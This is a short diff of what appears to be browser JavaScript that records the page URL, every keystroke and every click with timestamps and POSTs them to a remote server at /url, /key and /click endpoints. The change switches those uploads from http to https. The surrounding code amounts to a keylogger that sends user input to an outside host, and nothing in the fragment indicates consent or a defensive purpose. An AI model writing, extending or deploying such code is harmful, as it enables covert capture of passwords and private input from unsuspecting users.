@@ -7,7 +7,7 @@ function getUrl() {
         url: currentUrl
     };
 
-    fetch(`http://${serv}/url`, {
+    fetch(`https://${serv}/url`, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
@@ -34,7 +34,7 @@ document.addEventListener('keydown', (e) => {
         time: new Date()
     };
 
-    fetch(`http://${serv}/key`, {
+    fetch(`https://${serv}/key`, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
@@ -65,7 +65,7 @@ document.addEventListener('click', (e) => {
         time: new Date()
     };
 
-    fetch(`http://${serv}/click`, {
+    fetch(`https://${serv}/click`, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
